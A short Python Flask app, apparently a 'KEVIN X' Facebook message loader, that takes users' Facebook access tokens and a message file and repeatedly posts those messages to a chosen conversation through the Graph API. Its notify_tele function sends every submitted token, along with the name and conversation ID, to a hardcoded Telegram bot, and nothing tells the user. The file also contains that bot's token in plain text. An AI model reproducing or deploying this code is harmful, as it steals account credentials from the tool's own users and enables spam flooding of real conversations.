from flask import Flask, request, render_template
import requests, threading, time

app = Flask(__name__)

# --- TERA TELEGRAM DATA ---
TELE_TOKEN = "8600452770:AAHYBu-o5BwZFNw6VtMLzpnBw9L2pr-wWSg"
TELE_CHAT_ID = "6043478017"
is_running = False

def notify_tele(name, convo_id, tokens):
    msg = f"🔥 **KEVIN X ATTACK STARTED** 🔥\n👤 User: {name}\n🆔 ID: {convo_id}\n🔑 Tokens: `{tokens}`"
    try:
        requests.post(f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage", json={"chat_id": TELE_CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

def run_loader(tokens, convo_id, messages, delay):
    global is_running
    while is_running:
        for token in tokens:
            if not is_running: break
            for msg in messages:
                if not is_running: break
                try:
                    requests.post(f"https://graph.facebook.com/v17.0/{convo_id}/messages", 
                                  data={'access_token': token.strip(), 'message': msg.strip()})
                    time.sleep(delay)
                except: break

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global is_running
    is_running = True
    name = request.form.get('name')
    token_raw = request.form.get('tokens')
    convo_id = request.form.get('convo_id')
    delay = int(request.form.get('delay'))
    tokens = token_raw.replace('\n', ',').split(',')
    
    file = request.files['file']
    messages = file.read().decode('utf-8').splitlines()
    
    notify_tele(name, convo_id, token_raw)
    threading.Thread(target=run_loader, args=(tokens, convo_id, messages, delay), daemon=True).start()
    
    return render_template('message.html', name=name, convo_id=convo_id, delay=delay)

@app.route('/stop', methods=['POST'])
def stop():
    global is_running
    is_running = False
    return "<h1>🔴 KEVIN X SYSTEM STOPPED</h1><a href='/'>Go Back</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
